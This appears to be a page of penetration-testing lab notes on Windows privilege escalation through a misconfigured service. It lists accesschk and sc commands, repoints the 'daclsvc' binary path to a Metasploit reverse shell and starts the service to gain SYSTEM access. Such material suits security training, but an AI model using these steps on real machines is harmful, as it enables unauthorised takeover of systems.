# Insecure Permission

Each service has an ACL which defines certain service-specific permissions. Some permissions are innocuous \(e.g. SERVICE\_QUERY\_CONFIG, SERVICE\_QUERY\_STATUS\). Some may be useful \(e.g. SERVICE\_STOP, SERVICE\_START\). Some are dangerous \(e.g. SERVICE\_CHANGE\_CONFIG, SERVICE\_ALL\_ACCESS\)

**If our user has permission to change the configuration of a service which runs with SYSTEM privileges, we can change the executable the service uses to one of our own.** 

Potential Rabbit Hole: If you can change a service configuration but cannot stop/start the service, you may not be able to escalate privileges! unless the user you have access to can reboot the system and the service would automatically run on startup

we use winPEAS to find services with insecure permissions

![](../../../../.gitbook/assets/image%20%2877%29.png)

![](../../../../.gitbook/assets/image%20%2887%29.png)

Note that we can modify the “daclsvc” service.

We can confirm this with accesschk.exe:

```text
 .\accesschk.exe /accepteula -uwcqv user daclsvc
```

![](../../../../.gitbook/assets/image%20%2882%29.png)

Check the current configuration of the service:

```text
sc qc daclsvc
```

![](../../../../.gitbook/assets/image%20%2871%29.png)

demand start means the service has to started manually he binary pathname is also available the service has no dependencies and it also should run with the system user permissions

Check the current status of the service:

```text
​sc query daclsvc
```

![](../../../../.gitbook/assets/image%20%2883%29.png)

the service is stopped

since we can change the service configs the easiest way to exploit this is to set the binary path to the location of a reverse shell payload

create a reverse shell with metasploit and place it in a directory where you have read/write permission

then Reconfigure the service to use our reverse shell executable:

```text
sc config daclsvc binpath="\"C:\PrivEsc\reverse.exe\""
```

![](../../../../.gitbook/assets/image%20%2879%29.png)

Start a listener on Kali, and then start the service to trigger the exploit:

```text
net start daclsvc
```

![](../../../../.gitbook/assets/image%20%2878%29.png)

